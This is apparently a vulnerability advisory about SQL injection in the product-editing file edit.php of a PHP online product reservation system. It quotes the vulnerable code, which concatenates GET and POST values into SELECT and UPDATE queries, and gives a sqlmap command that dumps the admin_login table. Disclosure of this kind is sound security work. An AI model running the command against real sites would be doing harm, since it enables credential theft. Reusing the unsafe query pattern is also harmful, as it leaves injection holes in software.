# SQL Injection Vulnerability in edit.php (Product Editing)

**Project**: Online Product Reservation System In PHP With Source Code

**Vendor**: Source Code & Projects (code-projects.org)

**Vulnerable File**: handgunner-administrator/edit.php

**Version**: V1.0

**Description**:

A critical SQL injection vulnerability exists in the product editing functionality. The application directly concatenates user input from both GET and POST parameters into SQL queries without validation, allowing attackers to extract sensitive database data and modify product information.

### Analyse

**Vulnerability: SQL Injection in SELECT and UPDATE Queries**

```php
include('../config/config.php');

// Line 4: User input from GET without validation
$user = $_GET['prod_id'];

// Line 6: VULNERABLE! Direct concatenation into SELECT query
$result= mysql_query ("SELECT * FROM products WHERE id = '$user'") or die(mysql_error());
$test= mysql_fetch_array($result);

if(!$result)
    {
    die("ERRUR: Data not found..");
    }

        $image = $test['image'];
        $description= $test['desc'];
        $name= $test['name'];
        $price = $test['price'];
        $model = $test['model'];
        $serial = $test['serial_no'];


if (isset($_POST['Submit']))
{

    // Line 25-28: User input from POST without validation
    $name = $_POST['name'];
    $price = $_POST['price'];
    $model = $_POST['model'];
    $serial = $_POST['serial'];


    // Line 31: VULNERABLE! Direct concatenation into UPDATE query
    mysql_query("UPDATE products SET name ='$name',price='$price',model='$model',serial_no='$serial' WHERE id = '$user'") or die (mysql_error());

/* header ("location:view_prod.php"); */

}
```

**Vulnerability Analysis**:

1. **GET Parameter Injection**: `prod_id` used directly in SELECT query (line 6)
2. **POST Parameter Injection**: Multiple parameters in UPDATE query (line 31)
3. **Multiple Injection Points**: Both `name`, `price`, `model`, `serial` (POST) and `prod_id` (GET)
4. **No Input Validation**: All parameters directly concatenated into SQL
5. **No Prepared Statements**: Uses deprecated `mysql_query()` function
6. **No Authentication**: File can be accessed without login

### POC

```bash
sqlmap -u "http://localhost:8081/handgunner-administrator/edit.php?prod_id=1" \
  --data="name=test&price=100&model=test&serial=123" \
  --batch \
  -D cj_handgunner \
  -T admin_login \
  --dump
```

[![pZUIhT0.png](https://s41.ax1x.com/2026/01/03/pZUIhT0.png)](https://imgchr.com/i/pZUIhT0)

**References**:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
